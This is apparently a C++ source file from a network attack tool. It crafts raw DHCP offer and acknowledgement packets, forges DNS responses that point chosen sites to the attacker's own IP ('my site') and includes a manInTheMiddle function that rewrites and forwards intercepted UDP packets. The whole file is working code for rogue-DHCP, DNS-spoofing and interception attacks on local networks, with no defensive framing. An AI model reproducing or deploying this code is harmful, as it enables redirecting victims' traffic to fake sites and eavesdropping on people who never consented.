#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Headers.h"
#include "Utils.h"
#include <iostream>
#include <WS2tcpip.h>
#pragma pack(1)
#include <random>

void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP);

void createDHCPDiscoverPacket(char* raw_packet, AddressInfo& info)
{


	std::random_device dev;
	std::mt19937 rng(dev());
	std::uniform_int_distribution<std::mt19937::result_type> rand(1, 65536);

	createIPv4Header(
			raw_packet,
			0,
			sizeof(IP_header) + sizeof(DHCP_header) + sizeof(UDP_header),
			info.noIP,
			info.broadcast,
			htons((uint16_t)rand(rng))
	);

	createUDPHeader(
			raw_packet,
			sizeof(IP_header),
			68, 67,
			sizeof(UDP_header) + sizeof(DHCP_header)
	);

	createDHCPdiscoverHeader(
			raw_packet,
			sizeof(IP_header) + sizeof(UDP_header),
			info.htype
	);
}

void createDHCPOfferPacket(char* raw_packet, void* pDHCP, void* pIP , AddressInfo& info)
{
	DHCP_header hDHCP = *(DHCP_header*)pDHCP;
	IP_header hIP = *(IP_header*)pIP;
	sockaddr_in toStr;
	toStr.sin_addr.s_addr = createRandomIP(info);
	printIP(toStr.sin_addr.s_addr);
	createEthernetHeader(
		raw_packet,
		0,
		(uint8_t*)hDHCP.chaddr,
		info.byteMac
	);

	createIPv4Header(
		raw_packet,
		sizeof(Ethernet_header),
		sizeof(IP_header) + sizeof(DHCP_header) + sizeof(UDP_header),
		info.gateWay,
		(uint8_t*)inet_ntoa(toStr.sin_addr),
		hIP.ip_id
	);

	createUDPHeader(
		raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header),
		67, 68,
		sizeof(UDP_header) + sizeof(DHCP_header)
	);

	createDHCPOfferHeader(
		raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header),
		hDHCP,
		info,
		toStr.sin_addr.s_addr
	);
}

void createDHCPackPacket(char* raw_packet, void* pDHCP, void* pIP, AddressInfo& info)
{
	DHCP_header hDHCP = *(DHCP_header*)pDHCP;
	IP_header hIP = *(IP_header*)pIP;
	sockaddr_in toStr;
	toStr.sin_addr.s_addr = getRequestedIP(*(DHCP_header*)pDHCP);
	
	createEthernetHeader(
		raw_packet,
		0,
		(uint8_t*)hDHCP.chaddr,
		info.byteMac
	);

	createIPv4Header(
		raw_packet,
		sizeof(Ethernet_header),
		sizeof(IP_header) + sizeof(DHCP_header) + sizeof(UDP_header),
		info.gateWay,
		(uint8_t*)inet_ntoa(toStr.sin_addr),
		hIP.ip_id
	);

	createUDPHeader(
		raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header),
		67, 68,
		sizeof(UDP_header) + sizeof(DHCP_header)
	);

	//((UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)])->chksum = 0;



	createDHCPackHeader(
		raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header),
		hDHCP,
		info
	);

	/* for speed purpose i wont calculate the checksum for the DHCP, it is not mandatory*/
	/*
	((UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)])->chksum = htons(net_checksum_tcpudp(
		htons(((UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)])->len),
		17,
		(uint8_t*)&(((IP_header*)&raw_packet[sizeof(Ethernet_header)])->ip_srcaddr),
		(uint8_t*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)]
	));
	*/
}

size_t createDNSResponsePacket(char* raw_packet, char* qDNS, AddressInfo& info)
{
	DNS_header dns{};
	IP_header ip{};
	UDP_header udp{};

	sockaddr_in toStr1;
	sockaddr_in toStr2;

	//DNS_record* records = (DNS_record*)malloc(ntohs(dns.questions) * sizeof(DNS_record));

	DNS_record rec{};
	DNS_record* records = &rec;
	DNS_query que{};
	DNS_query* query = &que;

	size_t qsize = 0;
	size_t rsize = 0;
	size_t frameSize;
	uint16_t ptr = 0b1100000000000000;	// saying its a pointer

	DNS_answer answer{};


	ip = *(IP_header*)qDNS;
	udp = *(UDP_header*)&qDNS[sizeof(IP_header)];
	getDNSheader(qDNS, sizeof(IP_header) + sizeof(UDP_header), dns);

	toStr1.sin_addr.s_addr = ip.ip_destaddr;
	toStr2.sin_addr.s_addr = ip.ip_srcaddr;
	char* destaddr = inet_ntoa(toStr2.sin_addr);

	for (int i = 0; i < ntohs(dns.questions); i++)
	{
		query[i].name = (uint8_t*)&qDNS[sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) + qsize];
		query[i].question = (DNS_question*)&qDNS[sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) +
			qsize + (strlen((const char*)query[i].name) + 1)];
		if (query[i].question->qtype != htons(1) || !checkForWantedSite((char*)query[i].name, info))
			return -1;
		qsize += (strlen((const char*)query[i].name) + 1) + sizeof(DNS_question);
	}


	answer.type = htons(1);
	answer._class = htons(1);
	answer.ttl = htonl(100);
	answer.data_len = htons(4);

	for (int i = 0; i < ntohs(dns.questions); i++)
	{										/* 12 is the number of bytes untill the first name */
		if (i > 0)
			records[i].name = (uint8_t*)htons((ptr | (12 + strlen((const char*)query[i - 1].name) + 1) + sizeof(DNS_question)));	// pointing to the name
		records[i].name = (uint8_t*)htons((ptr | 12));
		records[i].resource = &answer;
		*((uint32_t*)&records[i].rdata) = inet_addr((const char*)info.ipv4);
		rsize += htons(answer.data_len) + sizeof(DNS_answer) + sizeof(uint8_t*);
	}

	uint8_t* mac = getARPinformation(ip.ip_srcaddr);
	if (!mac)
		return 0;


	createEthernetHeader(
		raw_packet,
		0,
		mac,
		info.byteMac
	);

	createDNSResponseHeader(
		raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header),
		dns
	);

	for (int i = 0; i < ntohs(dns.questions); i++)
	{
		memcpy(&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header)],
			query[i].name, strlen((const char*)query[i].name) + 1);

		memcpy((char*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) +
			(sizeof(DNS_question) * i) + (strlen((const char*)query[i].name) + 1)], query[i].question, sizeof(DNS_question));
	}

	size_t recsize = 4 + 1 + sizeof(DNS_answer);
	uint32_t nip = inet_addr((const char*)info.ipv4); // ip of the site they are "looking for" (my site)

	for (int i = 0; i < ntohs(dns.questions); i++)
	{
		memcpy((uint8_t*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) + qsize + recsize * i],
			&(records[i].name), sizeof(uint8_t*));
		memcpy((uint8_t*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) + qsize + recsize * i + sizeof(uint16_t)],
			(uint8_t*)&answer, sizeof(DNS_answer));
		*((uint32_t*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) + qsize + recsize * i
			+ sizeof(uint16_t) + sizeof(DNS_answer) - 2]) = nip;
	}

	createIPv4Header(
		raw_packet,
		sizeof(Ethernet_header),
		sizeof(IP_header) + sizeof(UDP_header) + sizeof(DNS_header) + qsize + rsize - 4,
		info.ipv4,
		(uint8_t*)destaddr,
		ip.ip_id
	);

	createUDPHeader(
		raw_packet,
		sizeof(Ethernet_header) + sizeof(IP_header),
		ntohs(udp.dst_port),
		ntohs(udp.src_port),
		sizeof(UDP_header) + sizeof(DNS_header) + qsize + rsize - 4
	);

	((UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)])->chksum = net_checksum_tcpudp(
		htons(((UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)])->len),
		17,
		(uint8_t*)&(((IP_header*)&raw_packet[sizeof(Ethernet_header)])->ip_srcaddr),
		(uint8_t*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)]
	);
	((UDP_header*)&raw_packet[sizeof(Ethernet_header) + sizeof(IP_header)])->chksum = 0;

	frameSize = sizeof(Ethernet_header) + sizeof(IP_header) + sizeof(UDP_header) +
		sizeof(DNS_header) + qsize + rsize - 4;

	/*adding fcs to the end of the packet*/
	*((uint32_t*)(&raw_packet[frameSize])) = in_fcs((uint8_t*)raw_packet, frameSize);

	return frameSize + 4;
}

size_t manInTheMiddle(char* raw_packet, uint8_t* mitm_packet, uint8_t* dstMAC, uint16_t dstPort, uint32_t dstIP, AddressInfo& info)
{	
	size_t frameSize;

	Ethernet_header* pEther = (Ethernet_header*)mitm_packet;
	memcpy(pEther->dest_addr, dstMAC, 6);
	pEther->frame_type = htons(0x0800);
	
	IP_header* pIP = (IP_header*)raw_packet;
	pIP->ip_destaddr = dstIP;
	pIP->ip_srcaddr = inet_addr((char*)info.ipv4);
	pIP->ip_checksum = 0;
	pIP->ip_checksum = in_checksum((uint16_t*)pIP, sizeof(IP_header));

	memcpy(pEther->src_addr, info.byteMac, 6);

	UDP_header* pUDP = (UDP_header*)&raw_packet[sizeof(IP_header)];
	pUDP->dst_port = htons(dstPort);
	pUDP->chksum = 0;
	pUDP->chksum = htons(net_checksum_tcpudp(htons(pUDP->len), 17, (uint8_t*)&pIP->ip_srcaddr, (uint8_t*)pUDP));

	memcpy(&mitm_packet[sizeof(Ethernet_header)], raw_packet, ntohs(pIP->ip_total_length));


	frameSize = ntohs(pIP->ip_total_length) + sizeof(Ethernet_header);
	*((uint32_t*)(&mitm_packet[frameSize])) = in_fcs((uint8_t*)mitm_packet, frameSize);

	return ntohs(pIP->ip_total_length) + sizeof(Ethernet_header) + 4;
}

void getDHCPPacketInfo(char* packet, DHCP_header& pDHCP, UDP_header& pUDP, IP_header& pIP)
{
	getIPheader(
		packet,
		0,
		pIP
	);

	getUDPheader(
		packet,
		sizeof(IP_header),
		pUDP
	);

	getDHCPheader(
		packet,
		sizeof(IP_header) + sizeof(UDP_header),
		pDHCP
	);
}
